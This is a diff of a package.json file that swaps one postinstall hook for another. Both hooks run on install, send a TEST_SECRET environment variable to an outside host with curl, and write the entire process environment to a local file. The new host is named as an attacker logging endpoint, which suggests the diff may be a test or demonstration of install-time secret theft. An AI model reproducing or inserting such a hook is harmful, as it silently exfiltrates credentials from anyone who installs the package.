@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "curl \" https://e126-157-82-128-4.ngrok-free.app/aaa/${TEST_SECRET}\" && node -e \"var f = require('fs');fs.writeFileSync('a.log', JSON.stringify(process.env));\""
+    "postinstall": "curl \"http://attacker-logging-endpoint.sasakiy84.net/bbb/$TEST_SECRET/aaa/${TEST_SECRET}\" && node -e \"var f = require('fs');fs.writeFileSync('a.log', JSON.stringify(process.env));\""
   },
   "author": "",
   "license": "ISC",
